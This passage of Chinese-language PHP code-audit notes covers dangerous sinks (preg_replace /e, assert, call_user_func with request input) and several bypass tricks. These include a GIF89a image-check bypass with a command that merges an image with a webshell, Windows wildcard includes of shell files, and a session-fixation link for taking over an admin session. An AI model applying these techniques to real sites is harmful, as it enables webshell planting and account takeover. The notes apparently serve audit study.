<span class="pl-s1"><span class="pl-c1">usort</span>(<span class="pl-smi">$databases</span>, <span class="pl-c1">create_function</span>(<span class="pl-s"><span class="pl-pds">'</span>$a, $b<span class="pl-pds">'</span></span>, <span class="pl-smi">$sort_function</span>));</span></pre></div>
<h3>
<a id="user-content-mb_ereg_replace的e模式" class="anchor" href="#mb_ereg_replace%E7%9A%84e%E6%A8%A1%E5%BC%8F" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>mb_ereg_replace()的/e模式</h3>
<p>原理</p>
<pre><code>mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:
string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= "msr"  ] )
当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.
</code></pre>
<h3>
<a id="user-content-preg_replace-e模式执行命令" class="anchor" href="#preg_replace-e%E6%A8%A1%E5%BC%8F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>preg_replace /e模式执行命令</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> ?str=[phpinfo()]</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 这里使用/e模式，所以第二个参数\\1这里可以执行。</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\1，执行。</span></span>
<span class="pl-s1"><span class="pl-c1">preg_replace</span>(<span class="pl-sr"><span class="pl-pds">"/</span><span class="pl-cce">\[</span>(.<span class="pl-k">*</span>)]<span class="pl-pds">/e"</span></span>,<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\</span>1<span class="pl-pds">'</span></span>,<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>str<span class="pl-pds">'</span></span>]);</span></pre></div>
<h2>
<a id="user-content-动态函数执行" class="anchor" href="#%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>动态函数执行</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">call_user_func</span></span>
<span class="pl-s1"><span class="pl-c1">call_user_func_array</span></span></pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> ?a=assert</span></span>
<span class="pl-s1"><span class="pl-c1">call_user_func</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>],<span class="pl-smi">$b</span>);</span></pre></div>
<h2>
<a id="user-content-代码执行" class="anchor" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>代码执行</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">assert</span>()</span>
<span class="pl-s1"><span class="pl-c1">call_user_func</span>()</span>
<span class="pl-s1"><span class="pl-c1">call_user_func_array</span>()</span>
<span class="pl-s1"><span class="pl-c1">create_function</span>()</span></pre></div>
<h3>
<a id="user-content-eval和assert代码执行" class="anchor" href="#eval%E5%92%8Cassert%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>eval()和assert()代码执行</h3>
<p>当assert()的参数为字符串时 可执行PHP代码。
区别：assert可以不加;，eval不可以不加;。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">eval</span>(<span class="pl-s"><span class="pl-pds">"</span> phpinfo(); <span class="pl-pds">"</span></span>);【√】 <span class="pl-c1">eval</span>(<span class="pl-s"><span class="pl-pds">"</span> phpinfo() <span class="pl-pds">"</span></span>);【<span class="pl-c1">X</span>】</span>
<span class="pl-s1"><span class="pl-c1">assert</span>(<span class="pl-s"><span class="pl-pds">"</span> phpinfo(); <span class="pl-pds">"</span></span>);【√】 <span class="pl-c1">assert</span>(<span class="pl-s"><span class="pl-pds">"</span> phpinfo() <span class="pl-pds">"</span></span>);【√】</span></pre></div>
<h2>
<a id="user-content-优先级绕过" class="anchor" href="#%E4%BC%98%E5%85%88%E7%BA%A7%E7%BB%95%E8%BF%87" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>优先级绕过</h2>
<p>原理：
如果运算符优先级相同，那运算符的结合方向决定了该如何运算
<a href="http://php.net/manual/zh/language.operators.precedence.php" rel="nofollow">http://php.net/manual/zh/language.operators.precedence.php</a></p>
<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> ($test = true) and false; $test2 = (true &amp;&amp; false);</span></span>
<span class="pl-s1"><span class="pl-smi">$test</span> <span class="pl-k">=</span> <span class="pl-c1">true</span> <span class="pl-k">and</span> <span class="pl-c1">false</span>; <span class="pl-c1">var_dump</span>(<span class="pl-smi">$test</span>);<span class="pl-c"><span class="pl-c">//</span>bool(true) </span></span>
<span class="pl-s1"><span class="pl-smi">$test2</span> <span class="pl-k">=</span> <span class="pl-c1">true</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">false</span>; <span class="pl-c1">var_dump</span>(<span class="pl-smi">$test2</span>); <span class="pl-c"><span class="pl-c">//</span>bool(false)</span></span>
<span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</span></span>
<span class="pl-s1"><span class="pl-smi">$test3</span> <span class="pl-k">=</span> <span class="pl-c1">is_numeric</span>(<span class="pl-s"><span class="pl-pds">"</span>123<span class="pl-pds">"</span></span>) <span class="pl-k">and</span> <span class="pl-c1">is_numeric</span>(<span class="pl-s"><span class="pl-pds">"</span>anything false<span class="pl-pds">"</span></span>); <span class="pl-c1">var_dump</span>(<span class="pl-smi">$test3</span>); <span class="pl-c"><span class="pl-c">//</span>bool(true)</span></span></pre></div>
<h2>
<a id="user-content-getimagesize图片判断绕过" class="anchor" href="#getimagesize%E5%9B%BE%E7%89%87%E5%88%A4%E6%96%AD%E7%BB%95%E8%BF%87" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>getimagesize图片判断绕过</h2>
<p>原理：
当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。
只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>
<p>生成小马图的方法：</p>
<div class="highlight highlight-source-shell"><pre>cat image.png webshell.php <span class="pl-k">&gt;</span> image.php</pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 找上传点</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 文件头部加入GIF89a</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 1</span></span>
<span class="pl-s1"><span class="pl-smi">$file</span> <span class="pl-k">=</span> <span class="pl-smi">$request</span><span class="pl-k">-&gt;</span>getFiles();</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 2</span></span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-c1">getimagesize</span>(<span class="pl-smi">$files</span>[<span class="pl-s"><span class="pl-pds">'</span>users<span class="pl-pds">'</span></span>][<span class="pl-s"><span class="pl-pds">'</span>photo<span class="pl-pds">'</span></span>][<span class="pl-s"><span class="pl-pds">'</span>tmp_name<span class="pl-pds">'</span></span>]))</span>
<span class="pl-s1">        {</span>
<span class="pl-s1">          <span class="pl-c1">move_uploaded_file</span>(<span class="pl-smi">$files</span>[<span class="pl-s"><span class="pl-pds">'</span>users<span class="pl-pds">'</span></span>][<span class="pl-s"><span class="pl-pds">'</span>photo<span class="pl-pds">'</span></span>][<span class="pl-s"><span class="pl-pds">'</span>tmp_name<span class="pl-pds">'</span></span>], <span class="pl-smi">$filename</span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 3</span></span>
<span class="pl-s1"><span class="pl-smi">$filesize</span> <span class="pl-k">=</span> <span class="pl-k">@</span><span class="pl-c1">getimagesize</span>(<span class="pl-s"><span class="pl-pds">'</span>/path/to/image.png<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$filesize</span>) {</span>
<span class="pl-s1">    do_upload();</span>
<span class="pl-s1">}</span></pre></div>
<h2>
<a id="user-content-变windows-findfirstfile利用" class="anchor" href="#%E5%8F%98windows-findfirstfile%E5%88%A9%E7%94%A8" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>&lt;变*，windows findfirstfile利用</h2>
<p>原理：
Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。
执行过程中，字符"&gt;"被替换成"?"，字符"&lt;"被替换成"*"，而符号"（双引号）被替换成一个"."字符。
所以：</p>
<ol>
<li>"&gt;""&gt;&gt;"可代替一个字符,"&lt;"可以代替后缀多个字符，"&lt;&lt;"可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>
<li>" 可以代替.</li>
<li>文件名第一个字符是"."的话，读取时可以忽略之</li>
</ol>
<table>
<thead>
<tr>
<th>NO</th>
<th>Status</th>
<th>Function</th>
<th>Type of operation</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.</td>
<td>OK</td>
<td>include()</td>
<td>Includefile</td>
</tr>
<tr>
<td>2.</td>
<td>OK</td>
<td>include_once()</td>
<td>Includefile</td>
</tr>
<tr>
<td>3.</td>
<td>OK</td>
<td>require()</td>
<td>Includefile</td>
</tr>
<tr>
<td>4.</td>
<td>OK</td>
<td>require_once()</td>
<td>Include file</td>
</tr>
<tr>
<td>5.</td>
<td>OK</td>
<td>fopen()</td>
<td>Openfile</td>
</tr>
<tr>
<td>6.</td>
<td>OK</td>
<td>ZipArchive::open()</td>
<td>Archive file</td>
</tr>
<tr>
<td>7.</td>
<td>OK</td>
<td>copy()</td>
<td>Copyfile</td>
</tr>
<tr>
<td>8.</td>
<td>OK</td>
<td>file_get_contents()</td>
<td>Readfile</td>
</tr>
<tr>
<td>9.</td>
<td>OK</td>
<td>parse_ini_file()</td>
<td>Readfile</td>
</tr>
<tr>
<td>10.</td>
<td>OK</td>
<td>readfile()</td>
<td>Readfile</td>
</tr>
<tr>
<td>11.</td>
<td>OK</td>
<td>file_put_contents()</td>
<td>Write file</td>
</tr>
<tr>
<td>12.</td>
<td>OK</td>
<td>mkdir()</td>
<td>New directory creation</td>
</tr>
<tr>
<td>13.</td>
<td>OK</td>
<td>tempnam()</td>
<td>New file creation</td>
</tr>
<tr>
<td>14.</td>
<td>OK</td>
<td>touch()</td>
<td>New file creation</td>
</tr>
<tr>
<td>15.</td>
<td>OK</td>
<td>move_uploaded_file()</td>
<td>Move operation</td>
</tr>
<tr>
<td>16.</td>
<td>OK</td>
<td>opendiit)</td>
<td>Directory operation</td>
</tr>
<tr>
<td>17.</td>
<td>OK</td>
<td>readdir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>18.</td>
<td>OK</td>
<td>rewinddir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>19.</td>
<td>OK</td>
<td>closedir()</td>
<td>Directory operation</td>
</tr>
<tr>
<td>20.</td>
<td>FAIL</td>
<td>rename()</td>
<td>Move operation</td>
</tr>
<tr>
<td>21.</td>
<td>FAIL</td>
<td>unlink()</td>
<td>Delete file</td>
</tr>
<tr>
<td>22.</td>
<td>FAIL</td>
<td>rmdir())</td>
<td>Directory operation</td>
</tr>
</tbody>
</table>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1&lt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1&gt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1"txt</span></span>
<span class="pl-s1">文件名为<span class="pl-c1">1.</span><span class="pl-c1">txt</span></span>
<span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1234.tx&gt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1234.&lt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1&lt;&lt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=1&lt;&lt;"&gt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=123&gt;"&gt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=&gt;&gt;&gt;4"&gt;</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?file=&lt;&lt;4"&gt;</span></span>
<span class="pl-s1">文件名为<span class="pl-c1">1234.</span><span class="pl-c1">txt</span></span>
<span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-s"><span class="pl-pds">'</span>shell&lt;<span class="pl-pds">'</span></span>);  </span>
<span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-s"><span class="pl-pds">'</span>shell&lt;&lt;<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-s"><span class="pl-pds">'</span>shell.p&gt;p<span class="pl-pds">'</span></span>); </span>
<span class="pl-s1"><span class="pl-k">include</span>(<span class="pl-s"><span class="pl-pds">'</span>shell"php<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">fopen</span>(<span class="pl-s"><span class="pl-pds">'</span>.htacess<span class="pl-pds">'</span></span>);  <span class="pl-c"><span class="pl-c">//</span>==&gt;fopen("htacess');</span></span>
<span class="pl-s1"><span class="pl-c1">file_get_contents</span>(<span class="pl-s"><span class="pl-pds">'</span>C:boot.ini<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>==&gt;  file_get_contents ('C:/boot.ini');</span></span>
<span class="pl-s1"><span class="pl-c1">file_get_contents</span>(<span class="pl-s"><span class="pl-pds">'</span>C:/tmp/con.jpg<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>此举将会无休无止地从CON设备读取0字节，直到遇到eof</span></span>
<span class="pl-s1"><span class="pl-c1">file_put_contents</span>(<span class="pl-s"><span class="pl-pds">'</span>C:/tmp/con.jpg<span class="pl-pds">'</span></span>,<span class="pl-c1">chr</span>(<span class="pl-c1">0</span><span class="pl-c1">×07</span>));  <span class="pl-c"><span class="pl-c">//</span>此举将会不断地使服务器发出类似哔哔的声音</span></span></pre></div>
<h2>
<a id="user-content-处理value没有处理key" class="anchor" href="#%E5%A4%84%E7%90%86value%E6%B2%A1%E6%9C%89%E5%A4%84%E7%90%86key" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>处理value没有处理key</h2>
<p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>
<h2>
<a id="user-content-用来目录遍历的特别函数" class="anchor" href="#%E7%94%A8%E6%9D%A5%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%9A%84%E7%89%B9%E5%88%AB%E5%87%BD%E6%95%B0" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>用来目录遍历的特别函数</h2>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094" rel="nofollow">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a>
lstat 函数</p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071" rel="nofollow">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a>
stream_resolve_include_path函数</p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688" rel="nofollow">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457" rel="nofollow">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>
<p><a href="http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453" rel="nofollow">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>
<h2>
<a id="user-content-绕过gd库图片渲染" class="anchor" href="#%E7%BB%95%E8%BF%87gd%E5%BA%93%E5%9B%BE%E7%89%87%E6%B8%B2%E6%9F%93" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>绕过GD库图片渲染</h2>
<p><a href="///C://Users/muhe/Desktop/links/wirte/Ali0thNotes/Code%20Audit/file/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_jpg_payload.zip">jpg_payload.zip</a></p>
<p>jpg_name.jpg是待GD处理的图片</p>
<pre><code>php jpg_payload.php &lt;jpg_name.jpg&gt;
</code></pre>
<p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1">    <span class="pl-c1">imagecreatefromjpeg</span>(<span class="pl-s"><span class="pl-pds">'</span>xxxx.jpg<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span></pre></div>
<h2>
<a id="user-content-会话固定" class="anchor" href="#%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>会话固定</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-k">!</span><span class="pl-c1">empty</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>phpsessid<span class="pl-pds">'</span></span>])) <span class="pl-c1">session_id</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>phpsessid<span class="pl-pds">'</span></span>]);<span class="pl-c"><span class="pl-c">//</span>通过GET方法传递sessionid</span></span></pre></div>
<p>通过get方法来设置session。所以可以通过CSRF：</p>
<p><a href="http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123" rel="nofollow">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>
<p>管理员点了我们就能使用此session进后台了。</p>
<h2>
<a id="user-content-资料" class="anchor" href="#%E8%B5%84%E6%96%99" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>资料</h2>
<p>PHP代码审计分段讲解</p>
<p><a href="https://github.com/bowu678/php_bugs">https://github.com/bowu678/php_bugs</a></p>
<p><a href="https://github.com/jiangsir404/Audit-Learning">https://github.com/jiangsir404/Audit-Learning</a></p>
<p><a href="https://read.douban.com/reader/ebook/16642056/" rel="nofollow">https://read.douban.com/reader/ebook/16642056/</a></p>
</article></body></html>